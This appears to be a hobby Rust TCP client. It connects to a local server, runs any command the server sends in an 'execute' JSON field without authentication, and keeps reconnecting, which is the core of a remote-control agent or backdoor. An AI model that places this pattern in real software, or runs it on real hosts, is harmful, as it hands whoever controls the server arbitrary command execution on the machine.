// File: client.rs
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;
use serde_json::Value;
use std::process::Command;


fn read_server_response(mut stream: TcpStream) {
    let mut buf = [0; 1024];
    loop {
        match stream.read(&mut buf) {
            Ok(n) => {
                if n == 0 {
                    println!("Server closed the connection");
                    break;
                }
                let message = String::from_utf8_lossy(&buf[..n]);
                
                // try to parse the message as JSON
                let value: Result<serde_json::Value, _> = serde_json::from_str(&message);
                let json_value = match value {
                    Ok(v) => v,
                    Err(e) => {
                        println!("Error parsing JSON: {}", e);
                        continue;
                    }
                };

                match json_value {
                    
                    j if j.get("execute").is_some() => {
                        let execute = j.get("execute").unwrap().as_str().unwrap();
                        println!("Execute: {}", execute);

                        let mut parts = execute.split_whitespace();
                        let command = parts.next().unwrap();
                        let args: Vec<&str> = parts.collect();

                        let output = Command::new(command)
                            .args(args)
                            .output()
                            .expect("Failed to execute command");


                        println!("Output: {}", String::from_utf8_lossy(&output.stdout));
                    }

                    _ => {}
                }

            }
            Err(e) => {
                eprintln!("Error reading from server: {}", e);
                break;
            }
        }
    }
}

fn connect_to_server() -> io::Result<TcpStream> {
    // tcp stream using native tls
    TcpStream::connect("127.0.0.1:15002")
}

fn reconnect_loop(mut stream: TcpStream) {
    loop {
        thread::sleep(Duration::from_secs(5)); // Wait for 5 seconds

        // Attempt to reconnect if the server closed the connection
        if let Err(_) = stream.write(&[0]) {
            println!("Reconnecting to server...");
            match connect_to_server() {
                Ok(new_stream) => {
                    stream = new_stream;
                    println!("Reconnected to server!");
                    // Spawn a new thread to read server responses
                    let cloned_stream = stream.try_clone().expect("Failed to clone stream");
                    thread::spawn(move || read_server_response(cloned_stream));
                }
                Err(e) => {
                    eprintln!("Failed to reconnect: {}", e);
                }
            }
        }
    }
}

pub fn start_server() -> io::Result<()> {
    println!("Connecting to server...");
    let mut stream = connect_to_server()?;
    println!("Connected to server!");
    
    let cloned_stream = stream.try_clone().expect("Failed to clone stream");
    let cloned_stream2 = stream.try_clone().expect("Failed to clone stream");

    // Spawn a separate thread to continuously read server responses
    let _ = thread::spawn(move || read_server_response(cloned_stream));

    // Spawn a background task to manage reconnections
    thread::spawn(move || reconnect_loop(cloned_stream2));

    // Main thread sends messages to the server
    let mut input = String::new();
    loop {
        io::stdin().read_line(&mut input)?;
        stream.write_all(input.as_bytes())?;
        input.clear();
    }
}